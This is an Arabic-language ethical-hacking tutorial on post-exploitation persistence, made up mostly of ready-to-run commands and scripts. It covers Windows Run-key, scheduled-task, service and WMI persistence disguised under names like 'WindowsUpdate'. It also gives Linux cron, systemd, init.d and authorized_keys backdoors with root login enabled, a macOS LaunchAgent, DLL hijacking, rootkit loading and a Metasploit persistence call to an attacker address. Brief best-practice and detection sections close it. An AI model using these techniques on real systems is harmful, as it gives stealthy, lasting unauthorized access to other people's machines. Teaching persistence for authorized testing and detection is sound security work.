
          .-""""""-.  
         /          \  
        |   PERSIST  |  
        |   -------  |  
        |  (.)  (.)  |  
         \   |  |   /  
          \  \__/  /  
           \      /  
            '.__.'  
             _||_  
            //  \\  
           //    \\  
          //______\\  
         "-.______.-"  
فن البقاء خفياً:

الاستمرارية (Persistence)
الاستمرارية هي تقنيات تستخدم للحفاظ على الوصول إلى النظام المستهدف حتى بعد إعادة تشغيله أو تحديثه أو إغلاقه. تعتبر من أهم جوانب مرحلة ما بعد الاستغلال في الاختبار الأخلاقي للاختراق.
طرق الاستمرارية على أنظمة Windows
1. استخدام مُسجل التشغيل (Registry)
# إنشاء مفتاح في سجل التشغيل للبدء عند تسجيل الدخول
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsService" /t REG_SZ /d "C:\path\to\payload.exe" /f

# استخدام وحدة Metasploit للاستمرارية عبر سجل التشغيل
run persistence -X -i 30 -p 443 -r [عنوان المهاجم]
2. مهام مجدولة (Scheduled Tasks)
# إنشاء مهمة تعمل كل ساعة
schtasks /create /tn "WindowsUpdate" /tr "C:\path\to\payload.exe" /sc hourly /ru "System"

# إخفاء المهمة
attrib +h +s "C:\path\to\payload.exe"
3. خدمات النظام (Services)
# إنشاء خدمة جديدة
sc create "WindowsHelper" binPath= "C:\path\to\payload.exe" start= auto

# استخدام وحدة Metasploit
run exploit/windows/local/persistence_service
4. WMI Event Subscriptions
powershell# إنشاء اشتراك حدث WMI دائم
$filterName = "WindowsFilter"
$consumerName = "WindowsConsumer"
$exePath = "C:\path\to\payload.exe"

# إنشاء المرشح
$wmiParams = @{
    Name = $filterName
    EventNameSpace = 'root\cimv2'
    QueryLanguage = 'WQL'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 120 AND TargetInstance.SystemUpTime < 325"
}
$filter = Set-WmiInstance -Class '__EventFilter' -Namespace "root\subscription" -Arguments $wmiParams

# إنشاء المستهلك
$wmiParams = @{
    Name = $consumerName
    CommandLineTemplate = $exePath
}
$consumer = Set-WmiInstance -Class 'CommandLineEventConsumer' -Namespace "root\subscription" -Arguments $wmiParams

# ربط المرشح بالمستهلك
$wmiParams = @{
    Filter = $filter
    Consumer = $consumer
}
Set-WmiInstance -Class '__FilterToConsumerBinding' -Namespace "root\subscription" -Arguments $wmiParams
طرق الاستمرارية على أنظمة Linux
1. Cron Jobs
bash# إضافة مهمة cron تعمل كل 10 دقائق
(crontab -l 2>/dev/null; echo "*/10 * * * * /path/to/payload") | crontab -

# إضافة مهمة للتشغيل عند إعادة تشغيل النظام
echo "@reboot /path/to/payload" | crontab -
2. ملفات Systemd
bash# إنشاء وحدة systemd
cat > /etc/systemd/system/helper.service << EOF
[Unit]
Description=Helper Service
After=network.target

[Service]
Type=simple
ExecStart=/path/to/payload
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# تفعيل الخدمة
systemctl enable helper.service
systemctl start helper.service
3. ملفات rc.local و init.d
bash# استخدام rc.local (لم يعد مدعومًا في بعض التوزيعات)
echo "/path/to/payload &" >> /etc/rc.local
chmod +x /etc/rc.local

# إنشاء سكربت init.d
cat > /etc/init.d/helper << EOF
#!/bin/sh
### BEGIN INIT INFO
# Provides:          helper
# Required-Start:    $remote_fs $syslog
# Required-Stop:     $remote_fs $syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: Helper service
### END INIT INFO

case "$1" in
  start)
    /path/to/payload &
    ;;
  stop|restart|reload)
    ;;
esac
exit 0
EOF

chmod +x /etc/init.d/helper
update-rc.d helper defaults
4. سرقة SSH Keys وتعديل ملفات التكوين
bash# إضافة مفتاح SSH عام للوصول
mkdir -p ~/.ssh
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# تكوين SSH للسماح بتسجيل الدخول بالمفتاح
echo "PubkeyAuthentication yes" >> /etc/ssh/sshd_config
echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
طرق الاستمرارية على أنظمة macOS
bash# إنشاء ملف plist للتشغيل التلقائي
cat > ~/Library/LaunchAgents/com.helper.plist << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>
  <string>com.helper</string>
  <key>ProgramArguments</key>
  <array>
    <string>/path/to/payload</string>
  </array>
  <key>RunAtLoad</key>
  <true/>
  <key>KeepAlive</key>
  <true/>
</dict>
</plist>
EOF

# تفعيل الملف
launchctl load ~/Library/LaunchAgents/com.helper.plist
تقنيات الاستمرارية المتقدمة
1. DLL Hijacking
# البحث عن DLL قابلة للاستغلال
use post/windows/gather/dll_hijack

# استبدال DLL مشروعة بنسخة ضارة
copy payload.dll C:\Program Files\Application\legitimate.dll.bak
copy malicious.dll C:\Program Files\Application\legitimate.dll
2. حقن نواة النظام (Kernel Rootkits)
# تحميل وحدة kernel للاستمرارية (مثال خطير - للعلم فقط)
insmod /path/to/rootkit.ko
3. تعديل firmware (UEFI/BIOS)
هذه تقنية متقدمة جداً وخطيرة، وتتطلب وصولاً فيزيائياً أو امتيازات مدير النظام الكاملة. لا ينصح باستخدامها حتى في اختبارات الاختراق الأخلاقية إلا بتصريح خاص ومحدد.
أفضل الممارسات للأمان

التنظيف الشامل: دائماً قم بإزالة جميع آليات الاستمرارية بعد انتهاء الاختبار
التوثيق: سجل كل آلية استمرارية تم تنفيذها
الاختبار القبلي: تأكد من أن آليات الاستمرارية لن تتسبب في تعطيل النظام
استخدام أدوات الكشف: تعلم كيفية اكتشاف آليات الاستمرارية باستخدام أدوات الأمان
المراقبة: راقب الأنظمة المستهدفة لضمان عدم حدوث آثار جانبية غير مقصودة

الكشف عن آليات الاستمرارية
# Windows - التحقق من سجل التشغيل
reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"

# Windows - التحقق من المهام المجدولة
schtasks /query /fo LIST /v

# Linux - التحقق من مهام cron
crontab -l

# عام - استخدام أدوات التحليل الجنائي
use post/windows/gather/forensics/enum_artifacts
use post/linux/gather/enum_configs
